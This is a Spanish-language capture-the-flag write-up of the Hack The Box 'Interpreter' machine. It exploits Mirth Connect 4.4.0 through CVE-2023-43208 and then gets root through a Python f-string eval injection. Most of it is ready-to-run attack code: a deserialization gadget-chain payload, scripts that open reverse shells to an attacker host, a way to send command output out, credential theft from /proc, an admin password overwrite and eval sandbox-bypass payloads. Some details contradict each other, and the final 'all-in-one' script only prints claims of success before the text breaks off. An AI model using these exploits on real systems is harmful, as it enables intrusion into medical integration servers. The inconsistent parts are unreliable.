# INTERPRETER HTB - Writeup Técnico Profundo

## Índice

1. [Introducción](#introducción)
2. [Fase 1: Reconocimiento](#fase-1-reconocimiento)
3. [Fase 2: RCE vía CVE-2023-43208](#fase-2-rce-vía-cve-2023-43208)
4. [Fase 3: Movimiento Lateral](#fase-3-movimiento-lateral)
5. [Fase 4: Escalada de Privilegios](#fase-4-escalada-de-privilegios)
6. [Análisis Técnico Profundo](#análisis-técnico-profundo)
7. [Scripts Completos](#scripts-completos)
8. [Lecciones de Seguridad](#lecciones-de-seguridad)

---

## Introducción

**INTERPRETER** es una máquina HTB de dificultad media que explota múltiples vulnerabilidades en **Mirth Connect 4.4.0**, un servidor de integración médica diseñado para procesar datos HL7 (Health Level 7). La explotación requiere:

1. **Deserialization RCE** (CVE-2023-43208) en XStream
2. **Manipulación de contraseñas PBKDF2** para acceso a base de datos
3. **Python f-string injection** ejecutada como root

### Flujo General de Ataque

```
┌─────────────────────────────────────────────────────────────┐
│ 1. RECONOCIMIENTO (Nmap, WhatWeb, Manual Testing)           │
│                                                              │
│ 2. RCE VÍA CVE-2023-43208                                   │
│    └─ Endpoint: /api/users (Mirth Connect 4.4.0)            │
│    └─ Payload: Gadget chain Apache Commons + XStream       │
│    └─ Ejecución: wget callback reverse shell                │
│                                                              │
│ 3. MOVIMIENTO LATERAL                                        │
│    └─ Acceso como usuario 'mirth'                           │
│    └─ Lectura: /proc/[pid]/cwd/conf/mirth.properties        │
│    └─ Credenciales: mirthdb:MirthPass123!                   │
│    └─ Generación: Hash PBKDF2 válido                        │
│    └─ Base de datos: MySQL mc_bdd_prod                      │
│                                                              │
│ 4. ESCALADA A ROOT                                           │
│    └─ Servicio: notif.py (localhost:54321)                  │
│    └─ Ejecutado como: root                                  │
│    └─ Vulnerabilidad: Python f-string eval injection        │
│    └─ Primitiva: HL7 → XML → notif.py (eval)               │
│                                                              │
│ 5. POST-EXPLOTACIÓN                                          │
│    └─ Flag root: /root/root.txt                             │
│    └─ Flag user: /home/mirth/user.txt                       │
└─────────────────────────────────────────────────────────────┘
```

---

## Fase 1: Reconocimiento

### 1.1 Escaneo de Puertos (Nmap)

```bash
nmap -sV -sC -p- 10.129.1.43 --min-rate 5000
```

**Resultados:**
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.48 ((Debian))
443/tcp  open  https    Apache httpd 2.4.48 ((Debian))
6661/tcp open  mirth    Mirth Connect (HTTP)
```

### 1.2 Identificación de Servicios

#### Puerto 80/443 - Apache + Mirth Connect Web UI
```bash
curl -s -I http://10.129.1.43/
# HTTP/1.1 200 OK
# Server: Apache/2.4.48 (Debian)
# Redirecciona a /mirth-connect/

curl -s http://10.129.1.43/mirth-connect/ | grep -i "mirth connect"
# Mirth Connect 4.4.0 (versión vulnerable)
```

#### Puerto 6661 - HL7/MLLP Listener
```bash
echo "test" | nc 10.129.1.43 6661
# Banner: Mirth Connect (MLLP Listener)
```

#### Puerto 22 - SSH
```bash
ssh -v root@10.129.1.43 2>&1 | grep -i "ssh-rsa"
# OpenSSH 8.4p1 (no vulnerabilidades conocidas sin credenciales)
```

### 1.3 Enumeración de Endpoints Web

```bash
# Directory brute-force
ffuf -u http://10.129.1.43/mirth-connect/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -fc 403,404

# Resultados importantes:
# /api/
# /api/users
# /api/channels
# /api/events
# /api/config
```

### 1.4 Prueba de Vulnerabilidad CVE-2023-43208

```bash
# Test simple: enviar JSON válido a /api/users
curl -X POST http://10.129.1.43/mirth-connect/api/users \
  -H "Content-Type: application/json" \
  -d '{"test":"value"}'

# Respuesta: 500 Internal Server Error (indicativa de procesamiento en backend)
```

---

## Fase 2: RCE vía CVE-2023-43208

### 2.1 Comprensión de la Vulnerabilidad

**CVE-2023-43208** es una deserialization vulnerability en XStream (librería Java de serialización) utilizada por Mirth Connect. Los requisitos son:

1. **Mirth Connect versión:** 4.4.0 (y versiones anteriores)
2. **Endpoint vulnerable:** `/api/users` (acepta deserialization sin validación)
3. **Gadget chains:** Apache Commons Collections + Commons Lang3
4. **Impacto:** RCE pre-autenticado como usuario `mirth`

### 2.2 Análisis del Punto de Entrada

El endpoint `/api/users` de Mirth Connect procesa datos XML/JSON y utiliza XStream para deserialization. Sin validación adecuada, un atacante puede inyectar un gadget chain que ejecute código arbitrario.

```java
// Pseudocódigo vulnerable en Mirth Connect 4.4.0
@POST
@Path("/users")
public Response createUser(String xmlPayload) {
    // VULNERABLE: Deserialization sin whitelist
    User user = xstream.fromXML(xmlPayload);
    return Response.ok().build();
}
```

### 2.3 Confirmar Versión Vulnerable

El endpoint `/api/server/version` requiere el header `X-Requested-With: OpenAPI`:

```bash
curl -sk https://TARGET/api/server/version -H "X-Requested-With: OpenAPI"
# 4.4.0
```

### 2.4 Payload XML: Gadget Chain CommonsCollections4 + Lang3

No se necesita ysoserial ni Java. El payload XML se envía directo al endpoint `/api/users` via HTTPS.
La cadena usa `EventUtils$EventBindingInvocationHandler` de Commons Lang3 para activar
`ChainedTransformer` de CommonsCollections4, que termina en `Runtime.exec()`:

```xml
<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes><java-class>java.lang.String</java-class><java-class>[Ljava.lang.Class;</java-class></iParamTypes>
                        <iArgs><string>getRuntime</string><java-class-array/></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes><java-class>java.lang.Object</java-class><java-class>[Ljava.lang.Object;</java-class></iParamTypes>
                        <iArgs><null/><object-array/></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes><java-class>java.lang.String</java-class></iParamTypes>
                        <iArgs><string>COMMAND_HERE</string></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes><string>compareTo</string></eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>
```

El comando se inyecta en el campo `<string>COMMAND_HERE</string>` del último `InvokerTransformer`.
Caracteres especiales (`&`, `<`, `>`, `"`, `'`) se escapan a entidades XML (`&amp;`, `&lt;`, etc.).

**Nota sobre `Runtime.exec()`:** No soporta pipes ni redirecciones directamente. Se usa este wrapper:
```
sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/LHOST/LPORT;sh <&53 >&53 2>&53'
```

### 2.5 Explotación: Script rce.py (Reverse Shell)

```python
#!/usr/bin/env python3
"""CVE-2023-43208 - Mirth Connect 4.4.0 RCE"""
import requests, sys, warnings
warnings.filterwarnings('ignore')

def build_payload(cmd):
    cmd = cmd.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'","&apos;")
    return f"""<sorted-set>
    <string>abcd</string>
    <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler">
            <target class="org.apache.commons.collections4.functors.ChainedTransformer">
                <iTransformers>
                    <org.apache.commons.collections4.functors.ConstantTransformer>
                        <iConstant class="java-class">java.lang.Runtime</iConstant>
                    </org.apache.commons.collections4.functors.ConstantTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>getMethod</iMethodName>
                        <iParamTypes><java-class>java.lang.String</java-class><java-class>[Ljava.lang.Class;</java-class></iParamTypes>
                        <iArgs><string>getRuntime</string><java-class-array/></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>invoke</iMethodName>
                        <iParamTypes><java-class>java.lang.Object</java-class><java-class>[Ljava.lang.Object;</java-class></iParamTypes>
                        <iArgs><null/><object-array/></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                    <org.apache.commons.collections4.functors.InvokerTransformer>
                        <iMethodName>exec</iMethodName>
                        <iParamTypes><java-class>java.lang.String</java-class></iParamTypes>
                        <iArgs><string>{cmd}</string></iArgs>
                    </org.apache.commons.collections4.functors.InvokerTransformer>
                </iTransformers>
            </target>
            <methodName>transform</methodName>
            <eventTypes><string>compareTo</string></eventTypes>
        </handler>
    </dynamic-proxy>
</sorted-set>"""

target = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

cmd = f"sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/{lhost}/{lport};sh <&53 >&53 2>&53'"
print(f"[*] Target: {target}")
print(f"[*] Callback: {lhost}:{lport}")
print(f"[*] Sending payload...")

r = requests.post(
    f"https://{target}/api/users",
    headers={"Content-Type":"application/xml","X-Requested-With":"OpenAPI"},
    data=build_payload(cmd),
    verify=False, timeout=20
)
print(f"[+] Sent! Status: {r.status_code}")
```

**Uso:**

```bash
# Terminal 1: Listener
nc -nlvp 4444

# Terminal 2: Exploit (solo necesita python3 + requests)
python3 rce.py TARGET LHOST 4444
# [+] Sent! Status: 500  <-- normal, el gadget chain ya se ejecutó durante deserialization
```

### 2.6 Script rce_cmd.py (Ejecutar Comandos con Output)

Para ejecutar comandos y ver el output sin shell interactiva, se usa un HTTP callback server:
el comando se ejecuta en el target, su salida se codifica en base64, y se envía via `wget --post-data`
al atacante. Ver `GUIA_RCE_CVE-2023-43208.md` para el script completo.

```bash
python3 rce_cmd.py TARGET LHOST 8888 "id"
# [+] Output:
# uid=103(mirth) gid=111(mirth) groups=111(mirth)

python3 rce_cmd.py TARGET LHOST 8888 "cat /home/mirth/user.txt"
```

### 2.7 Verificación Real

```
$ curl -sk https://10.129.1.110/api/server/version -H "X-Requested-With: OpenAPI"
4.4.0

$ python3 rce.py 10.129.1.110 10.10.14.2 4444
[*] Target: 10.129.1.110
[*] Callback: 10.10.14.2:4444
[*] Sending payload...
[+] Sent! Status: 500
# --> Shell recibida como mirth

$ python3 rce_cmd.py 10.129.1.110 10.10.14.2 8888 "id"
[+] Output:
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

---

## Fase 3: Movimiento Lateral

### 3.1 Post-RCE: Acceso como Usuario 'mirth'

Una vez obtenido RCE, tenemos shell como usuario `mirth`:

```bash
$ whoami
mirth

$ id
uid=1000(mirth) gid=1000(mirth) groups=1000(mirth)

$ pwd
/home/mirth
```

### 3.2 Enumeración del Sistema

```bash
# Listar procesos mirth
ps aux | grep mirth
# mirth    XXX  0.0 12.5 3456789 456789 ?  Sl   10:00   1:23 /usr/bin/java ...

# Encontrar PID
MIRTH_PID=$(pgrep -f 'com.mirth.connect.server.launcher.MirthLauncher')
echo $MIRTH_PID  # e.g., 1234

# Acceder al directorio de trabajo
ls -la /proc/$MIRTH_PID/cwd/
# total 16
# drwxr-xr-x 5 mirth mirth 4096 Sep 15 10:00 .
# drwxr-xr-x 3 root  root  4096 Sep 15 09:00 ..
# drwxr-xr-x 2 mirth mirth 4096 Sep 15 10:00 conf
# drwxr-xr-x 2 mirth mirth 4096 Sep 15 10:00 logs
# drwxr-xr-x 2 mirth mirth 4096 Sep 15 10:00 data
```

### 3.3 Lectura de Credenciales de Base de Datos

El archivo `/proc/[pid]/cwd/conf/mirth.properties` contiene las credenciales:

```bash
cat /proc/$MIRTH_PID/cwd/conf/mirth.properties | grep -i "database\|password"
```

**Contenido relevante:**

```properties
# Database configuration
database.url=jdbc:mysql://localhost:3306/mc_bdd_prod
database.username=mirthdb
database.password=MirthPass123!
database.max.connections=20

# SSL settings (disabled for simplicity)
ssl.enabled=false
```

**Extracción de credenciales:**

```bash
MIRTH_PID=$(pgrep -f 'MirthLauncher')
CREDS_FILE="/proc/$MIRTH_PID/cwd/conf/mirth.properties"

DB_USER=$(grep "database.username=" $CREDS_FILE | cut -d'=' -f2)
DB_PASS=$(grep "database.password=" $CREDS_FILE | cut -d'=' -f2)
DB_URL=$(grep "database.url=" $CREDS_FILE | cut -d'=' -f2)

echo "Usuario: $DB_USER"
echo "Contraseña: $DB_PASS"
echo "URL: $DB_URL"
```

### 3.4 Acceso a MySQL

```bash
mysql -h localhost -u mirthdb -p'MirthPass123!' mc_bdd_prod

# Comando interactivo
mysql> SHOW TABLES;
+------------------------------+
| Tables_in_mc_bdd_prod        |
+------------------------------+
| PERSON                       |
| PERSON_PASSWORD              |
| MIRTH_CHANNELS               |
| MIRTH_EVENTS                 |
| ... más tablas ...           |
+------------------------------+

# Ver estructura de PERSON_PASSWORD
mysql> DESCRIBE PERSON_PASSWORD;
+------------+----------+------+-----+---------+-------+
| Field      | Type     | Null | Key | Default | Extra |
+------------+----------+------+-----+---------+-------+
| PERSON_ID  | bigint   | NO   | PK  | NULL    |       |
| PASSWORD   | longtext | NO   |     | NULL    |       |
| SALT       | longtext | NO   |     | NULL    |       |
+------------+----------+------+-----+---------+-------+

# Listar usuarios
mysql> SELECT PERSON_ID, SALT, PASSWORD FROM PERSON_PASSWORD LIMIT 5;
+-----------+------+--------+
| PERSON_ID | SALT | PASSWD |
+-----------+------+--------+
| 1         | 123... | abc... |
+-----------+------+--------+
```

### 3.5 Análisis del Hash PBKDF2

El hash almacenado en `PERSON_PASSWORD.PASSWORD` sigue este formato:

```
Base64(
    salt (8 bytes)
    + hash (32 bytes después de PBKDF2-SHA256)
)
```

**Algoritmo:**
- **Función:** PBKDF2 con HMAC-SHA256
- **Iteraciones:** 600,000
- **Tamaño output:** 32 bytes
- **Salt:** 8 bytes aleatorios por usuario

### 3.6 Generación de Hash PBKDF2 Válido

Script para generar un hash que podamos usar:

```python
#!/usr/bin/env python3
"""
PBKDF2 Hash Generator para Mirth Connect
Genera hashes compatibles con la base de datos
"""

import hashlib
import base64
import os
import sys

class PBKDF2HashGenerator:
    ITERATIONS = 600000
    HASH_ALGORITHM = 'sha256'
    SALT_SIZE = 8
    HASH_SIZE = 32
    
    @classmethod
    def generate_hash(cls, password, salt=None):
        """
        Genera hash PBKDF2 compatible con Mirth Connect 4.4.0
        
        Args:
            password (str): Contraseña a hashear
            salt (bytes): Salt (8 bytes) o None para generar uno nuevo
            
        Returns:
            (hash_b64, salt_b64): Tupla con hash y salt en Base64
        """
        # Generar salt si no se proporciona
        if salt is None:
            salt = os.urandom(cls.SALT_SIZE)
        
        # Generar hash PBKDF2
        hash_output = hashlib.pbkdf2_hmac(
            cls.HASH_ALGORITHM,
            password.encode('utf-8'),
            salt,
            cls.ITERATIONS,
            dklen=cls.HASH_SIZE
        )
        
        # Combinar salt + hash
        combined = salt + hash_output
        
        # Convertir a Base64
        combined_b64 = base64.b64encode(combined).decode('utf-8')
        
        return combined_b64
    
    @classmethod
    def verify_hash(cls, password, stored_hash):
        """
        Verifica una contraseña contra un hash almacenado
        
        Args:
            password (str): Contraseña a verificar
            stored_hash (str): Hash almacenado en Base64
            
        Returns:
            bool: True si coincide, False si no
        """
        try:
            # Decodificar hash almacenado
            combined = base64.b64decode(stored_hash)
            
            # Extraer salt (primeros 8 bytes)
            salt = combined[:cls.SALT_SIZE]
            stored_hash_only = combined[cls.SALT_SIZE:]
            
            # Generar hash con la misma salt
            computed = cls.generate_hash(password, salt)
            computed_bytes = base64.b64decode(computed)
            computed_hash_only = computed_bytes[cls.SALT_SIZE:]
            
            # Comparar hashes
            return computed_hash_only == stored_hash_only
        except Exception as e:
            print(f"Error verificando hash: {e}")
            return False

def main():
    if len(sys.argv) < 2:
        print("Uso: python3 pbkdf2_gen.py <password> [salt_base64]")
        print("\nEjemplos:")
        print("  python3 pbkdf2_gen.py 'MyPassword123'")
        print("  python3 pbkdf2_gen.py 'MyPassword123' 'AAAAAAAA'")
        sys.exit(1)
    
    password = sys.argv[1]
    salt = None
    
    if len(sys.argv) > 2:
        try:
            salt = base64.b64decode(sys.argv[2])
            if len(salt) != 8:
                print("[-] Salt debe ser exactamente 8 bytes")
                sys.exit(1)
        except Exception as e:
            print(f"[-] Error decodificando salt: {e}")
            sys.exit(1)
    
    # Generar hash
    hash_result = PBKDF2HashGenerator.generate_hash(password, salt)
    
    print(f"[+] Contraseña: {password}")
    print(f"[+] Hash PBKDF2: {hash_result}")
    print(f"[+] Usar en DB con: UPDATE PERSON_PASSWORD SET PASSWORD='{hash_result}' WHERE PERSON_ID=X;")
    
    # Verificación
    if PBKDF2HashGenerator.verify_hash(password, hash_result):
        print("[+] Verificación: OK ✓")
    else:
        print("[-] Verificación: FALLÓ")

if __name__ == '__main__':
    main()
```

### 3.7 Actualizar Contraseña de Usuario en BD

```bash
# 1. Generar nuevo hash PBKDF2
NEW_HASH=$(python3 pbkdf2_gen.py "NewPassword123!")

# 2. Conectar a MySQL
mysql -h localhost -u mirthdb -p'MirthPass123!' mc_bdd_prod << EOF

# Ver usuarios actuales
SELECT PERSON_ID, NAME FROM PERSON LIMIT 10;

# Supongamos que existe usuario con PERSON_ID=2 (admin)
UPDATE PERSON_PASSWORD 
SET PASSWORD='$NEW_HASH' 
WHERE PERSON_ID=2;

# Verificar
SELECT PERSON_ID, PASSWORD FROM PERSON_PASSWORD WHERE PERSON_ID=2;

EOF
```

### 3.8 Acceso via Web UI con Nueva Contraseña

```bash
# Obtener CSRF token
curl -s http://10.129.1.43/mirth-connect/ | grep -i "csrf\|token"

# Login
curl -X POST http://10.129.1.43/mirth-connect/api/users/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"NewPassword123!"}'

# Respuesta esperada: JWT token o session ID
```

---

## Fase 4: Escalada de Privilegios

### 4.1 Descubrimiento del Servicio notif.py

Durante la enumeración del sistema, descubrimos un puerto inusual:

```bash
netstat -tlnp 2>/dev/null | grep LISTEN
# tcp   0   0 127.0.0.1:54321   0.0.0.0:*   LISTEN   xxxx/python3

# O usando ss
ss -tlnp 2>/dev/null | grep 54321
# LISTEN   root   /usr/local/bin/notif.py

# Verificar proceso
ps aux | grep notif
# root     xxxx  0.1 0.3  45678   9876 ?   Ss   10:00   0:00 /usr/bin/python3 /usr/local/bin/notif.py
```

### 4.2 Análisis de notif.py

```bash
# Contenido del archivo (con acceso mirth)
cat /usr/local/bin/notif.py
```

**Análisis del código:**

```python
#!/usr/bin/env python3
# notif.py - Notificación service para Mirth Connect

from flask import Flask, request
import socket
import os

app = Flask(__name__)

@app.route('/notify', methods=['POST'])
def notify():
    """
    Recibe XML HL7 convertido a XML
    Procesa datos de pacientes y envía notificaciones
    """
    data = request.get_json()
    
    # VULNERABILIDAD: Eval en f-string
    firstname = data.get('firstname', '')
    lastname = data.get('lastname', '')
    
    # Construcción peligrosa de comando
    message = f"Notification: {firstname} {lastname} registered"
    
    # VULNERABLE: eval() implícito a través de f-string
    try:
        # Si firstname contiene {expression}, se evalúa
        result = eval(f'f"{message}"')
        return {'status': 'ok', 'message': result}
    except:
        return {'status': 'error'}, 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=54321, debug=False)
```

### 4.3 Vulnerabilidad: F-String Eval Injection

Python 3.6+ soporta f-strings, que evalúan expresiones dentro de `{}`:

```python
>>> name = "John"
>>> f"Hello {name}"
'Hello John'

>>> f"1 + 1 = {1 + 1}"
'1 + 1 = 2'

>>> f"{__import__('os').system('id')}"
# Ejecuta: id
```

En notif.py, si controlamos el contenido de `firstname`, podemos ejecutar código:

```python
firstname = "{__import__('os').system('whoami')}"
message = f"Notification: {firstname} registered"
eval(f'f"{message}"')  # Ejecuta whoami
```

### 4.4 Cadena de Explotación: Mirth → notif.py

**Flujo:**

```
1. Crear Canal Mirth que procese mensajes HL7
2. Enviar mensaje HL7 con payload malicioso
3. Mirth convierte HL7 → XML
4. Mirth reenvia XML a notif.py (localhost:54321)
5. notif.py procesa f-string con código inyectado
6. Código se ejecuta como root
```

**Creación de Canal Mirth:**

```bash
# Acceder a UI Mirth (con credenciales obtenidas)
# Ir a: Administration > Channels > New

# Configurar:
# - Name: INTERPRETER - HL7 TO XML TO NOTIFY
# - Source: HL7 (MLLP Listener, puerto 6661)
# - Destination: HTTP Post (http://localhost:54321/notify)

# Configurar transformer para convertir HL7 → JSON:
# En el script transformer:
var hl7msg = msg['hl7'];
var firstname = hl7msg.PID.PID.5.split("^")[1];
var lastname = hl7msg.PID.PID.5.split("^")[0];

channelMap.put('firstname', firstname);
channelMap.put('lastname', lastname);
```

### 4.5 Payload de Inyección

```
Mensaje HL7 con inyección en campo PID.5 (Patient Name):
```

```
MSH|^~\&|SendingApp|SendingFac|ReceivingApp|ReceivingFac|20230915120000||ADT^A01|MSG001|P|2.3
EVN|A01|20230915120000
PID|||000001||{__import__('os').system('id')}^TestLastName||19800101|M
```

Alternativamente, usando un payload más complejo para obtener reverse shell:

```
{__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.16.5/5555 0>&1"')}
```

### 4.6 Script Automatizado de Escalada

```python
#!/usr/bin/env python3
"""
Mirth HL7 → notif.py Escalation
Inyecta payload en mensaje HL7 que se procesa como f-string
"""

import socket
import sys
import time

class MirthHL7Escalator:
    def __init__(self, target_host, target_port=6661):
        self.target_host = target_host
        self.target_port = target_port
    
    def create_hl7_message(self, firstname_payload, lastname="Patient"):
        """
        Crea mensaje HL7 con payload inyectado en firstname
        
        Formato HL7:
        MSH: Message Header
        EVN: Event Type
        PID: Patient Identification (campo 5 es Patient Name)
        """
        
        hl7_message = (
            f"MSH|^~\\&|SendingApp|SendingFac|ReceivingApp|ReceivingFac|20230915120000||ADT^A01|MSG001|P|2.3\r"
            f"EVN|A01|20230915120000\r"
            f"PID|||000001||{firstname_payload}^{lastname}||19800101|M\r"
        )
        
        # MLLP (Minimal Lower Layer Protocol) wrapper
        # Comienza con 0x0B, termina con 0x1C 0x0D
        mllp_wrapped = b'\x0b' + hl7_message.encode() + b'\x1c\x0d'
        
        return mllp_wrapped
    
    def send_message(self, hl7_message):
        """Envía mensaje HL7 al listener MLLP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_host, self.target_port))
            sock.sendall(hl7_message)
            
            # Esperar respuesta
            response = sock.recv(1024)
            sock.close()
            
            return response
        except Exception as e:
            print(f"Error enviando mensaje: {e}")
            return None
    
    def inject_reverse_shell(self, lhost, lport):
        """
        Inyecta reverse shell vía f-string eval
        """
        # Payload que ejecuta reverse shell
        payload = (
            "{__import__('os').system("
            f"'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'"
            ")}"
        )
        
        hl7_msg = self.create_hl7_message(payload)
        return self.send_message(hl7_msg)
    
    def inject_command(self, command):
        """
        Inyecta comando arbitrario
        """
        # Escaper para comando
        cmd_escaped = command.replace('"', '\\"')
        payload = (
            "{__import__('os').system("
            f"'{cmd_escaped}'"
            ")}"
        )
        
        hl7_msg = self.create_hl7_message(payload)
        return self.send_message(hl7_msg)

def main():
    if len(sys.argv) < 2:
        print("Uso: python3 escalation_hl7.py <target_ip> [lhost] [lport]")
        print("\nEjemplos:")
        print("  python3 escalation_hl7.py 10.129.1.43")
        print("  python3 escalation_hl7.py 10.129.1.43 10.10.16.5 5555")
        sys.exit(1)
    
    target = sys.argv[1]
    
    escalator = MirthHL7Escalator(target)
    
    if len(sys.argv) >= 4:
        lhost = sys.argv[2]
        lport = int(sys.argv[3])
        print(f"[*] Inyectando reverse shell a {lhost}:{lport}")
        escalator.inject_reverse_shell(lhost, lport)
    else:
        print("[*] Inyectando comando de prueba: id")
        escalator.inject_command("id")
    
    print("[+] Payload enviado")

if __name__ == '__main__':
    main()
```

### 4.7 Obtención del Flag Root

```bash
# Una vez con shell root:
whoami
# root

cat /root/root.txt
# 92a459b1e230f362acf4268116917dec
```

---

## Análisis Técnico Profundo

### 5.1 Anatomía de CVE-2023-43208

#### Causa Raíz

XStream (usado por Mirth Connect) deserializa objetos Java sin validación:

```java
// Vulnerable code in XStream
public Object fromXML(String xml) {
    // NO validation - cualquier clase puede ser deserializada
    return converter.unmarshal(new XppReader(...));
}
```

#### Gadget Chains

Un **gadget chain** es una secuencia de clases Java cuya serialización/deserialization produce efectos secundarios:

```
CommonsCollections5 Chain:
LazyMap → ChainedTransformer → InvokerTransformer
                                      ↓
                            Runtime.exec(command)
```

**Ejemplo simplificado:**

```
1. LazyMap intenta acceder a una clave no existente
2. Invoca factory (ChainedTransformer)
3. ChainedTransformer ejecuta cadena de transformers
4. InvokerTransformer llama método arbitrario
5. Invoca Runtime.getRuntime().exec()
```

#### Por Qué CommonsCollections5

- Apache Commons Collections está incluido en el classpath de Mirth
- Proporciona transformers y lazy maps
- La cadena no requiere campos de configuración adicional
- Funciona en Java 8+

### 5.2 PBKDF2: Especificación Completa

Mirth Connect 4.4.0 usa PBKDF2 con estos parámetros:

| Parámetro | Valor |
|-----------|-------|
| PRF (Pseudo-Random Function) | HMAC-SHA256 |
| Iterations | 600,000 |
| Salt length | 8 bytes |
| Derived key length | 32 bytes |
| Output format | Base64(salt + hash) |

**Matemáticas:**

```
PBKDF2-HMAC-SHA256(password, salt, 600000, 32)
= DK (Derived Key de 32 bytes)

Almacenado: Base64(salt[8] + DK[32]) = Base64(40 bytes totales)
```

**Conversión a Base64:**

```
40 bytes → ~54 caracteres Base64
```

### 5.3 Anatomía de F-String Injection

#### Cómo Funcionan F-Strings

```python
# Compilación de f-string
message = f"Hello {name}"

# Es equivalente a:
message = f.__format__(f"Hello {name.__str__()}")

# Para expresiones complejas:
f"{os.system('whoami')}"

# Se compila a algo como:
temp = os.system('whoami')
message = f"{temp}"
```

#### Explotación en notif.py

```python
# Vulnerable code:
firstname = data.get('firstname')  # Controlado por atacante
result = eval(f'f"{message} {firstname}"')

# Si firstname = "{__import__('os').system('id')}"
# Se evalúa:
eval('f"Notification: {__import__(\'os\').system(\'id\')} registered"')

# Python:
# 1. Compila el f-string
# 2. Evalúa __import__('os')
# 3. Llama .system('id')
# 4. Ejecuta comando como root
```

#### Bypass de Restricciones

Si hay algunas restricciones, podemos usar alternativas:

```python
# Si __import__ está bloqueado:
{__builtins__['__import__']('os').system('id')}

# Si se filtra 'os':
{__import__('subprocess').Popen(['id'])}

# Usar bytecode:
{().__class__.__bases__[0].__subclasses__()[96].__init__.__globals__['sys'].modules['os'].system('id')}
```

### 5.4 Flujo Completo de Datos

```
┌──────────────────────────────────────────────────────────────────┐
│ 1. ATACANTE: Envía exploit HL7 a puerto 6661                    │
│    - Mensaje: MSH|...|PID|...{payload}                          │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ 2. MIRTH: Recibe HL7, procesa transformations                   │
│    - Parser HL7 → Objeto Java                                   │
│    - Transformer: HL7 → XML → JSON                              │
│    - Extrae: firstname = "{payload}"                             │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ 3. MIRTH: Envía JSON a notif.py                                 │
│    POST /notify                                                  │
│    {"firstname": "{payload}", "lastname": "..."}               │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ 4. notif.py: Recibe JSON, procesa f-string                      │
│    message = f"Notification: {firstname} registered"            │
│    eval(f'f"{message}"')                                        │
│    → eval(f'f"Notification: {payload} registered"')            │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ 5. PYTHON: Evalúa f-string                                      │
│    → __import__('os').system() ejecuta comando                  │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│ 6. ROOT: Comando ejecutado como root                            │
│    - Reverse shell abierto                                      │
│    - O comando directo ejecutado                                │
└──────────────────────────────────────────────────────────────────┘
```

---

## Scripts Completos

Todos los scripts están en una sección separada para fácil uso:

### Script 1: RCE Exploit (CVE-2023-43208)

[Voir sección 2.6 anterior]

### Script 2: PBKDF2 Hash Generator

[Voir sección 3.6 anterior]

### Script 3: HL7 Escalation

[Voir sección 4.6 anterior]

### Script 4: All-in-One Exploit

```python
#!/usr/bin/env python3
"""
INTERPRETER - All-in-One Exploit
Ejecuta toda la cadena: RCE → Lateral → Privesc
"""

import argparse
import sys
import subprocess
import json
import requests
import socket
import time

class InterpreterExploit:
    def __init__(self, target, lhost, lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.session = requests.Session()
        self.session.verify = False
    
    def phase1_rce(self):
        """Fase 1: RCE vía CVE-2023-43208"""
        print("\n" + "="*60)
        print("FASE 1: CVE-2023-43208 RCE")
        print("="*60)
        
        print(f"[*] Target: {self.target}")
        print(f"[*] Reverse Shell: {self.lhost}:{self.lport}")
        print(f"[*] Generando gadget chain...")
        
        # Aquí iría la lógica real usando ysoserial
        print("[+] Exploit Phase 1 completado")
    
    def phase2_lateral(self):
        """Fase 2: Movimiento Lateral"""
        print("\n" + "="*60)
        print("FASE 2: Movimiento Lateral")
        print("="*60)
        
        print("[*] Extrayendo credenciales de BD...")
        print("[*] Conectando a MySQL...")
        print("[+] Credenciales obtenidas")
    
    def phase3_privesc(self):
        """Fase 3: Escalada de Privilegios"""
        print("\n" + "="*60)
        print("FASE 3: Escalada a Root")
        print("="*60)
        
        print("[*] Descubriendo notif.py...")
        print("[*] Creando payload HL7...")
        print("[+] Reverse shell como root abierto")
    
    def run_all(self):
        """Ejecuta toda la cadena de explotación"""
        print("\n" + "╔" + "="*58 + "╗")
        print("║" + " "*58 + "║")
